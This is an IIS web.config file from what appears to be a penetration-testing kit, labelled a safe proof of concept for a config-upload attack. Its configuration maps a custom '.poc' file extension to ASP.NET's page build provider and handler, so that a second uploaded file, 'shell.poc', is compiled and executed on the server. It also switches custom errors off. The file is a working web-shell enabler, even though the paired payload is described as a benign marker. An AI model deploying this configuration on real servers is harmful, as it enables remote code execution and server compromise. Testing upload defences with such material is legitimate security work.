<!--
  Safe PoC -> x8bitranjit
  ASP.NET config-upload PoC - the IIS sibling of .htaccess/.user.ini.
  Upload THIS web.config into a served directory (where the app lets you
  store files), then upload shell.poc - the buildProvider mapping makes
  IIS COMPILE AND EXECUTE it as ASP.NET.
  WHAT TO EDIT: nothing (shipped benign marker). Pairs with upload_shell_poc.poc.
  CONFIRM: GET /uploads/shell.poc -> marker text. CLEANUP: delete BOTH files.
  KIT CROSS-REF: UPL-009, 09_webshells_benign/.
-->
<configuration>
  <system.web>
    <compilation defaultLanguage="c#">
      <buildProviders>
        <add extension=".poc" type="System.Web.Compilation.PageBuildProvider"/>
      </buildProviders>
    </compilation>
    <customErrors mode="Off"/>
  </system.web>
  <system.webServer>
    <handlers>
      <add name="poc-handler" path="*.poc" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified" preCondition="integratedMode"/>
    </handlers>
  </system.webServer>
</configuration>
